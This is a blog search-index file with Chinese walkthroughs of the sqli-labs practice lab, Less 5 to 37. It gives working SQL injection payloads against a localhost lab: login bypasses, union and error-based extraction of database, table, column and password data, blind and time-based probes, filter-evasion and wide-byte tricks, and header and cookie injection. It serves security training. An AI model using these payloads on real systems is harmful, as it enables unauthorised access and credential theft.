<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>less38</title>
      <link href="/2020/11/25/less38/"/>
      <url>/2020/11/25/less38/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less1到less22总结</title>
      <link href="/2020/11/22/less1-dao-less22-zong-jie/"/>
      <url>/2020/11/22/less1-dao-less22-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>网址加密解密网站<br><a href="http://www.guabu.com/tools/wyjm.htm" target="_blank" rel="noopener">http://www.guabu.com/tools/wyjm.htm</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less23-37</title>
      <link href="/2020/11/21/less23/"/>
      <url>/2020/11/21/less23/</url>
      
        <content type="html"><![CDATA[<h2 id="一-less23"><a href="#一-less23" class="headerlink" title="一.less23"></a>一.less23</h2><p>本关不能用–+来进行输出,源码中自动换成空格了<br><a href="https://imgchr.com/i/DGtYi4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/DGtYi4.png" alt=""></a></p><p>通过单引号测试获得的报错信息得知是单引号闭合<br>猜测原sql语句</p><pre><code>select id,username,password from users where id='xx'</code></pre><p>方法一:特殊字符,作用是截断(相当于注释)</p><pre><code>;%00http://127.0.0.1/sqli-labs/Less-23/?id=-1'union select 1,2,database();%00</code></pre><p>方法二(这个闭合构造的是真的强):</p><pre><code>#利用原生的有单引号构造闭合'2'http://127.0.0.1/sqli-labs/Less-23/?id=-1'union select 1,database(),'2</code></pre><p>利用方法2的思路联合注入或者报错注入之类的都行,就不赘述了</p><h2 id="二-less24"><a href="#二-less24" class="headerlink" title="二.less24"></a>二.less24</h2><p>这关的手法直接看下图即可<br>警示:要防止账号里有非法字符<br><a href="https://imgchr.com/i/DGDyRS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/DGDyRS.png" alt=""></a><br><a href="https://imgchr.com/i/DGDBIP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/DGDBIP.png" alt=""></a></p><h2 id="三-less25和less25a"><a href="#三-less25和less25a" class="headerlink" title="三.less25和less25a"></a>三.less25和less25a</h2><h3 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h3><p>本关主要的考点在于 or和and 过滤(考点在这里所以就不用别的方法了)，如何绕过 or 和 and 过滤。一般性提供以下几种思路：</p><ul><li><p>（1）    大小写变形 Or,OR,oR</p></li><li><p>（2）    编码，hex，urlencode</p></li><li><p>（3）    添加注释/<em>or</em>/</p></li><li><p>（4）    利用符号 and=&amp;&amp;    or=||</p></li></ul><p>比如利用 || 绕过or的过滤然后进行注入,由于本关存在输出报错，所以可以用报错注入</p><pre><code>http://127.0.0.1/sqli-labs/Less-25/?id=1' || updatexml(1,concat(0x7e,version()),1)--+    </code></pre><h3 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h3><p>本关不存在报错,所以报错注入不能用了,不过可以考虑联合注入或者延时注入<br><strong><em>联合注入</em></strong></p><pre><code>http://127.0.0.1/sqli-labs/Less-25a/?id=1 union select 1,2,3#</code></pre><p>延时注入</p><h2 id="四-less26和less26a"><a href="#四-less26和less26a" class="headerlink" title="四.less26和less26a"></a>四.less26和less26a</h2><p><strong><em>注:从本关开始,阿帕奇存在空格无法转义的问题(在ubantu上是可以的)</em></strong></p><p>本关结合25关，将空格，or，and,/*,#,–,/等各种符号过滤，此处对于and，or的处理方法不再赘述，参考25.此处我们需要说明两方面：对于注释和结尾字符的我们此处只能利用构造一个’来闭合后面到’；对于空格，有较多的方法：</p><ul><li>%09 TAB键（水平）</li><li>%0a 新建一行%0c新的一页</li><li>%0d return功能</li><li>%0b TAB键（垂直）</li><li>%a0空格(window无法解析 )</li></ul><p>由于在windows下阿帕奇的服务器上不能使用%a0解析空格,所以下面的代码都用括号+报错注入来举例(如果能解析空格的话就和之前完全一样了)</p><ul><li><p>报错注入获取数据库名:</p><pre><code>http://127.0.0.1/sqli-labs/Less-26/?id=1'||updatexml(1,concat(0x7e,database(),1),1)||'1'='1</code></pre></li><li><p>报错注入获取security下的表名:</p><pre><code>http://127.0.0.1/sqli-labs/Less-26/?id=1'||updatexml(0x7e,(select(group_concat(table_name))from (infoorrmation_schema.tables)where (table_schema='security')),1)||'1'='1</code></pre></li><li><p><strong>注:由于本关会对sql语句中的or进行一次过滤,所以在information那里要写成infoorrmation*</strong></p></li></ul><p><a href="https://imgchr.com/i/DJ71Sg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/23/DJ71Sg.png" alt=""></a></p><ul><li><p>报错注入获取users中的列名:</p><pre><code>http://127.0.0.1/sqli-labs/Less-26/?id=1'||updatexml(0x7e,(select(group_concat(column_name))from (infoorrmation_schema.columns)where (table_name="emails")),1)||1='1</code></pre><p><a href="https://imgchr.com/i/DJqzcD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/23/DJqzcD.png" alt=""></a></p></li><li><p>获取username和password</p></li></ul><p>因为一次性取会存在数据取补全的情况,所以可以选择靠id一个个取(注意where不能加括号)</p><pre><code>http://127.0.0.1/sqli-labs/Less-26/?id=1'||updatexml(1,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from (users)where(id=1)),1)||1='1</code></pre><p><strong><em>这里我不知道为什么我的电脑里会出现第一个数据不能完整显示的问题,sql可以正常运行</em></strong><br><a href="https://imgchr.com/i/DJxt0g" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/23/DJxt0g.png" alt=""></a></p><h2 id="五-less27和less27a"><a href="#五-less27和less27a" class="headerlink" title="五.less27和less27a"></a>五.less27和less27a</h2><h3 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h3><p>本关主要考察将union，select和26关过滤掉的字符。此处我们依旧和26关的方式是一样的，只需要将union和select改为大小写混合就可以突破,具体略</p><h3 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h3><p>本题不存在报错输出,所以不能用报错注入,这关id使用双引号闭合,其他的同less27,可以用联合注入和%a0来进行注入</p><h2 id="五-less28和less28a"><a href="#五-less28和less28a" class="headerlink" title="五.less28和less28a"></a>五.less28和less28a</h2><h3 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h3><p>本题和27关几乎没有区别,就id那里用了单引号闭合,直接联合或者报错注入即可</p><h3 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h3><p>本关与 28 基本一致,但是是单引号+单括号闭合，只是过滤条件少了几个。</p><h2 id="六-总结-less23-28"><a href="#六-总结-less23-28" class="headerlink" title="六.总结(less23-28)"></a>六.总结(less23-28)</h2><p>这几关都是在处理特殊符号被过滤时的问题</p><p>遇到字符过滤的情况有如下方法:</p><ul><li>1.特殊字符过滤</li><li>2.用括号把不同块包起来构造合法sql语句</li><li>3.对于过滤字母单词的,可以把字母小写改成大写,或者用重复的方式试试比如;or被replace进行过滤且进行一次,就可以用 oorr 来构造</li></ul><hr><h2 id="七-less29"><a href="#七-less29" class="headerlink" title="七.less29"></a>七.less29</h2><p><strong><em>本关开始到31是基于服务器的两层架构,phpstudy不支持,所以只讲基本思路不做演示(基本和前面一样)</em></strong></p><p>两个服务器里,apache是真正要用到了,然后tomcat起到的是过滤作用<br>。比如下面代码的网址中<strong><em>第一个id=1是给tomcat的,是不起作用的,第二个id才起作用(就这一个知识点)其他的注入方式同之前</em></strong></p><pre><code>http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=-2'union select 1,user(),3--+</code></pre><h2 id="八-less30"><a href="#八-less30" class="headerlink" title="八.less30"></a>八.less30</h2><p>这里第二个id是双引号闭合,其他一样</p><h2 id="九-less31"><a href="#九-less31" class="headerlink" title="九.less31"></a>九.less31</h2><p>这里第二个id是双引号+单括号闭合</p><h2 id="十-总结-less29-31"><a href="#十-总结-less29-31" class="headerlink" title="十.总结(less29-31)"></a>十.总结(less29-31)</h2><p>(暂时略)</p><hr><p><strong><em>less-32,33,34,35,36,37 六关全部是针对’和\的过滤,下面会讲到宽字节注入的手法</em></strong><br><a href="https://imgchr.com/i/DUEIaR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/24/DUEIaR.png" alt=""></a></p><h2 id="十一-less32"><a href="#十一-less32" class="headerlink" title="十一. less32"></a>十一. less32</h2><p>通过输出的sql语句可以看出,我们手动添加的单引号被过滤掉了(源码中使用replace过滤的)<br><a href="https://imgchr.com/i/DUE9vF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/24/DUE9vF.png" alt=""></a></p><pre><code>http://127.0.0.1/sqli-labs/Less-32/?id=-1 %df'union select 1,2,database() --+</code></pre><p>说明:从gbk编码的原理可知,汉字是占两个字节的,然后由上面可知urlencode(')    = %5c%27,前面补一个%df的,就能把\吃掉,%27则作为一个单独的符号在外面</p><p>上面的代码思路就是如此,加一个%df后就和普通的注入一样了<br>(这里应该是因为编码的原因下图中输出的sql语句中手动添加的单引号乱码)</p><p><a href="https://imgchr.com/i/DUVx6U" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/24/DUVx6U.png" alt="结果图"></a></p><h2 id="十二-less33"><a href="#十二-less33" class="headerlink" title="十二.less33"></a>十二.less33</h2><p>本关过滤使用函数 addslashes(),用于在预定义字符之前添加反斜杠的字符串(预定义字符: ‘，”，\ )<br>本关依旧可以用%df绕过,代码同less32</p><p><strong><em>防御漏洞的方法 :使用addslashes(),我们需要将mysql_query设置为binary的方式，才能防御此漏洞。</em></strong></p><h2 id="十三-less34"><a href="#十三-less34" class="headerlink" title="十三.less34"></a>十三.less34</h2><p>本关是post型的注入漏洞,由于单引号等特殊字符被过滤<br><a href="https://imgchr.com/i/DUZs3V" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/24/DUZs3V.png" alt=""></a></p><p><strong><em>我们此处介绍一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为�’   (别漏了单引号)</em></strong></p><p>按照下面的方式就可以登陆成功了,然后直接用报错注入就行了(我不是很懂用�’ 的时候输出的sql语句里明明在’前面有个转义字符,那这个单引号有什么用,为什么删除之后就不能正常运行,会报如下的错)</p><pre><code>账号: �' or 1=1#密码随便输</code></pre><p><a href="https://imgchr.com/i/DUnwAH" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/25/DUnwAH.png" alt=""></a></p><pre><code>#这个报错我不太明白什么意思llegal mix of collations (utf8_general_ci,IMPLICIT) and (gbk_chinese_ci,COERCIBLE) for operation '='</code></pre><h2 id="十四-less35"><a href="#十四-less35" class="headerlink" title="十四.less35"></a>十四.less35</h2><p>这关按照天书的说法,和第二关一毛一样,我感觉可能有哪里有漏  </p><pre><code># 整型注入http://127.0.0.1/sqli-labs/Less-35/?id=-1 union select 1,2,database()#</code></pre><h2 id="十五-less36"><a href="#十五-less36" class="headerlink" title="十五.less36"></a>十五.less36</h2><p>本关使用mysql_real_escape_string()函数来进行过滤的  </p><p><strong><em>mysql_real_escape_string()的作用 : 基本和addslashes()相同转义SQL语句中使用的字符串中的特殊字符,如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</em></strong></p><p>受影响的字符:  </p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>本关通关手段和之前一样,%df和utf-16的单引号形式两种方法都能绕过检测然后实施注入</p><pre><code>http://127.0.0.1/sqli-labs/Less-36/?id=-1 %df'union select 1,user(),database()--+http://127.0.0.1/sqli-labs/Less-36/?id=-1 �'union select 1,user(),database()--+</code></pre><p><a href="https://imgchr.com/i/DUKewF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/25/DUKewF.png" alt=""></a></p><p><strong><em>防御漏洞的方法 :在使用mysql_real_escape_string()时,将mysql设置为gbk即可</em></strong></p><p>设置代码：</p><pre><code>Mysql_set_charset(‘gbk’,’$conn’</code></pre><h2 id="十六-less37"><a href="#十六-less37" class="headerlink" title="十六.less37"></a>十六.less37</h2><p>本关也是使用mysql_real_escape_string()函数来进行过滤的<br>其他的同less34,都是post的注入类型,由于和addslashes()原理相同,所以代码也相同</p><pre><code>账号:admin�' or 1=1#密码随便输</code></pre><h2 id="十七-总结-less32-37"><a href="#十七-总结-less32-37" class="headerlink" title="十七.总结(less32-37)"></a>十七.总结(less32-37)</h2><p>1.上面给出了三种过滤的方式分别是 ：</p><ul><li>replace</li><li>addslashes()</li><li>mysql_real_escape_string()。</li></ul><p>其中第二第三种是差不多,都是通过转义字符来过滤。防御方式也已经在上面给出不再赘述.</p><p>破解方法:</p><ul><li><p>对replace前面的关卡已经详细讲过了,这里不细说，总之就是各种替换,用大小写等各种手段。</p></li><li><p>第二三种过滤方式的破解手段就是看情况使用用%df和�’,其中post型的注入不能用前者</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>less11-22</title>
      <link href="/2020/11/21/less11-22/"/>
      <url>/2020/11/21/less11-22/</url>
      
        <content type="html"><![CDATA[<ul><li>注1:从现在less11开始,进入post的世界了,前十关都是get请求,post请求在网址上看不见,要开Burpsuit等工具可以看到。下面为为了方便,都以F12中的抓包方式来查看表单<h2 id="1-less11"><a href="#1-less11" class="headerlink" title="1.less11"></a>1.less11</h2></li></ul><p>1.通过查看表单中的信息可以知道,less11的请求就只有简单的username和password,并且值就是我们在输入框输入的值<br><a href="https://imgchr.com/i/DlorZD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlorZD.png" alt=""></a><br>2.假设我们一直存在账号admin，常时通过逻辑改写使用万能密码:  </p><pre><code>username框中输入 admin'#password框随便输</code></pre><p>结果会发现可以也能登陆<br><a href="https://imgchr.com/i/DlIsCn" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlIsCn.png" alt=""></a></p><p>原理:</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#显然,单引号构造了admin的闭合,然后后面的代码都被注释掉了</span><span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> xx <span class="token keyword">where</span> username<span class="token operator">=</span>admin'<span class="token comment" spellcheck="true"># and password='xx' </span></code></pre><p>3.测试列数<br>在账号框中输入如下内容,order by 2的时候能正确返回,3的时候不返回</p><pre><code>admin'  order by 3#admin'  order by 2#</code></pre><p><a href="https://imgchr.com/i/DlqCB6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlqCB6.png" alt="返回失败的页面"></a></p><p><strong>* 结论:表中数据有两列*</strong></p><h3 id="4-union注入获取数据"><a href="#4-union注入获取数据" class="headerlink" title="4.union注入获取数据"></a>4.union注入获取数据</h3><p>注意:这里username必须是不存在的,否则会正常输出admin,然后联合查询,这样的话username和password就会对应查找到联合查询的值</p><pre><code>Username：1admin'union select 1,database()# passwd=1（任意密码）</code></pre><p><a href="https://imgchr.com/i/D3ZWxs" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/D3ZWxs.png" alt="获取数据库名"></a></p><p> <strong>*由此我们可以发现,把账号名按章上面的格式输入,密码随便输,可以回显想要的数据。找到注入点后,可以开始获取敏感数据了,获取数据库名,接着获取表名,然后获取列名,最后把整个列的数据爆破出来    *</strong></p><p>下面做一下完整演示,只写username框的内容(其实这些语句前面已经讲过了,less1中有给出爆数据库中各个数据的方法,重点在于找到注入点):</p><ul><li>1.获取当前数据库名<pre><code>1admin'union select 1,database()# passwd=1（任意密码）</code></pre><ul><li>2.获取所有表名(由1知数据库名security) <pre><code>1admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema="security"# </code></pre></li></ul></li></ul><ul><li><p>3.获取user表中所有数据</p><pre><code>1admin union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users" --+</code></pre><p><a href="https://imgchr.com/i/DQYfyD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQYfyD.png" alt="结果图"></a></p></li><li><p>4.爆数据</p></li></ul><pre><code>把id=2的username和password找出来1adimin union select 1,username,password from users where id=2 --+</code></pre><h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>双引号单括号闭合: (“admin”),其余不变</p><h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><p>1.首先测试 admin ,发现由报错<br><a href="https://imgchr.com/i/D3NqHS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/D3NqHS.png" alt="D3NqHS.png"></a><br><strong><em>所以判断出是单引号+单括号的闭合: (‘admin’)</em></strong><br>登陆成功的用户名:</p><pre><code>admin')#</code></pre><p>2.当登陆成功时,页面不会由任何数据回显,但是会显示successfully，所以判断这是布尔盲注,盲注手法不再赘述<br><a href="https://imgchr.com/i/D3UiHU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/D3UiHU.png" alt="D3UiHU.png"></a></p><h2 id="四-less14"><a href="#四-less14" class="headerlink" title="四.less14"></a>四.less14</h2><p>依旧是盲注<br><strong><em>本题重点还判断是闭合类型</em></strong><br>1.首先测试单引号’,发现没有报错回显,测试”,有报错回显<br><a href="https://imgchr.com/i/D3U4VU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/D3U4VU.png" alt=""></a><br><strong><em>判断出是双引号闭合：”admin”</em></strong></p><pre><code>admin"#</code></pre><p>其他的同less13</p><h2 id="五-less15"><a href="#五-less15" class="headerlink" title="五.less15"></a>五.less15</h2><p>本关没有任何提示,在猜测闭合类型的时候,只能慢慢试(本关是单引号闭合)<br>思路:<br>可以用下面四种最基础的闭合方式试试哪种能实现万能登陆</p><pre><code>admin1' or 1=1#  (这关这里可以过)admi1n') or 1=1# admi1n" or 1=1#admi1n") or 1=1#</code></pre><p>用延时注入进行猜解,不赘述</p><h2 id="六-less16"><a href="#六-less16" class="headerlink" title="六.less16"></a>六.less16</h2><p>同less15,本关的闭合类型是双引号+单括号闭合,测试方法和其余的地方同less15</p><h1 id="七-less17"><a href="#七-less17" class="headerlink" title="七,less17"></a>七,less17</h1><p>本关username被经过特殊处理不能在此处注入（check_input函数会对username进行处理）,所以只能考虑在password处注入,这样的话username必须要是存在的,我们给admin,本关依旧是盲注,手法同上不再赘述,登陆成功和失败有不同响应<br><a href="https://imgchr.com/i/D3LnzQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D3LnzQ.png" alt="chech_input函数"></a><br>其实这个函数的大致原理就是取除非法字符,比如单引号,双引号,反斜杠,null</p><p>以延时注入猜解为例</p><pre><code>username:adminpassword:11'and If(ascii(substr(database(),1,1))=115,1,sleep(5))#</code></pre><h2 id="七-总结-less11-17"><a href="#七-总结-less11-17" class="headerlink" title="七.总结(less11-17)"></a>七.总结(less11-17)</h2><p>步骤:  </p><ul><li><p>1.先通过尝试构造闭合,测试自己构造的payload能否执行,比如username和密码乱输然后后面加 or 1=1,测试是否能登陆成功,如果登陆成功则构造闭合成功 </p></li><li><p>2.构造成功后,判断注入手法:<br>less11-12都会在登陆成功时输出登陆成功的账号密码,所以可以依靠这个输出敏感信息.<br>less13-16都是盲注只能猜解,其中less13-14有报错提示,less15到16没有,只有登陆成功和登陆失败的提示,所以后者只能慢慢尝试构造闭合<br>less17的username在代码层面进行了特殊处理所以不能用username来注入，在password处注入手法同username,但是用户名一定要是存在的</p></li></ul><hr><h2 id="八-less18"><a href="#八-less18" class="headerlink" title="八.less18"></a>八.less18</h2><p>本关对username和password全部进行check_input的处理,所以不能通过构造闭合在不登陆成功的情况下进行注入了  </p><p>下面是输入正确账号密码时的回显结果<br><a href="https://imgchr.com/i/D80Pcd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D80Pcd.png" alt="登陆成功时显示的结果"></a><br>回显useragent和ip地址<br>从源码中我们找到了这句插入的sql语句<br><a href="https://imgchr.com/i/D80m4S" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D80m4S.png" alt="插入的sql语句"></a></p><pre class=" language-SQL"><code class="language-SQL">$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";</code></pre><p>插入的sql语句表示向uagents这张表中插入uagent(也就是User-Agent),ip,username<br><strong><em>通过上面的分析,我们知道可以在请求头处对useragent进行注入然后靠回显出我们想要的信息</em></strong></p><p>这里推荐使用火狐的插件  ModHeader,可以直接对请求头进行构造<br>构造方法(直接往ModHeader中加入下面其中依据代码然后正确登陆界面):<br><a href="https://imgchr.com/i/D80fvd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D80fvd.png" alt="D80fvd.png"></a></p><pre><code>#下面concat中的第二个参数随便改,可以用子查询,用less1中爆库语句来获取所有想要的信息' or updatexml(1,concat(0x7e,database()),1) or '1'='1' or updatexml(1,concat(0x7e,database()),1),'','')#</code></pre><p><a href="https://imgchr.com/i/D8s1RU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D8s1RU.png" alt="结果"></a><br><strong><em>注:values中不能用子查询,语法错误,所以这里需要使用报错注入不能直接select</em></strong><br><strong><em>分析:对于values中的 ‘$uagent’,左右有两个单引号,所以在上面的代码中第一个’是为了构造闭合,然后对对于上面的第一个式子,or 要执行的标量表达式 or ‘1’=’1,其中最后一个1没有手动加右单引号,这样原先的的右单引号才能形成闭合，也就是’1’=’1’。第二个式子是直接自己构造全部的values,然后把原先的注释掉了(less19中详细讲这种方法)</em></strong><br>补充:关于updatexm的想借可以看<br><a href="https://blog.csdn.net/weixin_43326436/article/details/106525909" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43326436/article/details/106525909</a><br><a href="https://blog.csdn.net/weixin_43326436/article/details/106525909" target="_blank" rel="noopener">updatexml的用法</a><br>下面是天书中的简要概述,可以翻回去看,concat中的参数至少要两个</p><pre><code>extractvalue(1,concat(0x7e,(select @@version),0x7e))    //mysql对xml数据进行查询和修改的xpath函数，xpath语法错误updatexml(1,concat(0x7e,(select @@version),0x7e),1)    //mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</code></pre><h2 id="九-less19"><a href="#九-less19" class="headerlink" title="九.less19"></a>九.less19</h2><p>本关输入正确的账号密码后显示的内容：</p><p>本关和less18几乎一样,只不过把useragent改成了referers,这两项都是在请求头里的我们可以通过手动更改,手法同less18,不再赘述</p><p>网页源码</p><pre><code>$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";</code></pre><p>以获取数据库名为例子(无意中发现了一个问题):</p><pre><code>#下面三个都可以(在less18中同理也行)'or updatexml(1,concat(0x7e,database()),1),'','')#'or updatexml(1,concat(0x7e,database()),1),'')#'or updatexml(1,concat(0x7e,database()),1))#</code></pre><p><strong><em>上面三种写法都可行的原因:我猜测是因为在用updatexml函数进行报错后下面的代码可能就不执行了</em></strong></p><h2 id="十-less20"><a href="#十-less20" class="headerlink" title="十.less20"></a>十.less20</h2><p>本关开始是对cookie信息的注入来获取信息<br>推荐插件:cookie edit</p><p><a href="https://imgchr.com/i/D8fkuT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D8fkuT.png" alt="最初的页面"></a><br><a href="https://imgchr.com/i/D8WxEQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D8WxEQ.png" alt="cookie注入后"></a><br>cookie的uname里原先的admin,我们直接构造闭合然后联合注入</p><pre><code>'union select 1,2,database()#</code></pre><h2 id="十一-less21"><a href="#十一-less21" class="headerlink" title="十一:less21"></a>十一:less21</h2><p>本关依旧是cookie注入,但是cookie的值经过了base64位加密(大部分cookie会采用的手法)<br><a href="https://imgchr.com/i/D8buPU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D8buPU.png" alt=""></a><br><a href="http://tools.bugscaner.com/base64/" target="_blank" rel="noopener">http://tools.bugscaner.com/base64/</a><br><strong><em>注:不是所有的网站解码都是正确的,有一些是有问题的,可以找几个网站做一下循环验证</em></strong></p><p>本关在cookie中注入下面的编码会报错</p><pre><code>'union select 1,2,database()#</code></pre><p>通过报错信息易得应该是单引号+单括号闭合，正解如下,就</p><pre><code>')union select 1,2,database()#</code></pre><p><a href="https://imgchr.com/i/D8LpcQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/D8LpcQ.png" alt="结果"></a></p><h2 id="十二-less22"><a href="#十二-less22" class="headerlink" title="十二.less22"></a>十二.less22</h2><p>本关同less11,只不过改成了双引号闭合而已,同昂需要加密</p><pre><code>"union select 1,2,database()#</code></pre><h2 id="十三-总结-less18-22"><a href="#十三-总结-less18-22" class="headerlink" title="十三.总结(less18-22)"></a>十三.总结(less18-22)</h2><p>手法总结:</p><ul><li>1.cookie非加密注入</li><li>2.cookie加密注入</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>less5-10</title>
      <link href="/2020/11/20/less5-10/"/>
      <url>/2020/11/20/less5-10/</url>
      
        <content type="html"><![CDATA[<ul><li>注1:从本节开始忽略order by的步骤,因为都是3所以为了方便不再进行赘述</li><li>注2:less5-10中,除了less7要求是用outfile 的方式来进行注入,其他的关卡界面都一样,只有sql语句返回true才会显示语句,否则不显示如下<br><a href="https://imgchr.com/i/DlRLDJ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlRLDJ.png" alt="DlRLDJ.png"></a></li></ul><h2 id="一-less5"><a href="#一-less5" class="headerlink" title="一.less5"></a>一.less5</h2><h3 id="1-测试"><a href="#1-测试" class="headerlink" title="1.测试"></a>1.测试</h3><ul><li>单引号测试:在id =1’ ,结果报错,说明此处可以注入,且是单引号注入</li><li>逻辑测试:id=1’ and 1=1 –+  ,可以正常回显,and 1=2 –+,不显示内容,说明存在布尔sql盲注,返回值为true就正常回显,返回值false就回显异常</li></ul><p>网页部分源码:(如果sql语句返回true就输出语句,否则不输出)<br><a href="https://imgchr.com/i/DQob4A" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQob4A.png" alt="DQob4A.png"></a></p><p>猜测sql语句:</p><pre class=" language-SQL"><code class="language-SQL">select xx from xx where id ='XX' and 1=1</code></pre><h3 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h3><p>利用sql语句的特性,我们可以进行暴力破解数据(比如数据库名,数据库的长度,表名);<br>以破解数据库名(security)为例:  </p><ul><li>方法一:(如果纯手动破解,效率低)：<br>(1)用left函数<br>先看一下数据库名，可以正常回显说明数据库名长度为 8<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(databases())=8 --+</code></pre></li><li><strong>说明:left(str,x);表示从左往右显示str的x个字符，返回值是ASCII码;*</strong><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)='s' --+</code></pre><a href="https://imgchr.com/i/DQTzxx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQTzxx.png" alt=""></a></li></ul><p>可以正常回显说明第一个字符确实是’s’,接着用left(database(),2)=’se’,会发现还是可以正常回显,所以第二个字符确实是’e’  </p><p><strong><em>注 : left的比较规则：和C语言的一样,比较第一个不同的字符</em></strong></p><p>(2)用substr()和ascii()<br>说明:   </p><ul><li><p>substr(str,begin,len):第一个参数是字符串,begin是字符串的开始点,len是截取的长度</p></li><li><p>ascii(str):返回str的ascii码</p></li></ul><p>获取security下的第一个表名   </p><pre><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101</code></pre><ul><li>想要查第二个字符后面改成substr(xx,2，1)即可***</li><li>想要查第二个表只要把limit 0,1改成limit 1,1即可  </li><li><strong>注:这里的database()就是’security’;*</strong></li></ul><p>含义拆解:先截取数据库表名然后转换成ascii码进行判断,不断拆解判断每个点</p><p>(3)利用regexp获取（2）中users表中的列名</p><p>regexp的用法:str regexp’^xxx’   ,看str中是否有xxx,必须从前向后匹配,比如 username regexp’^ser’ 返回的是false 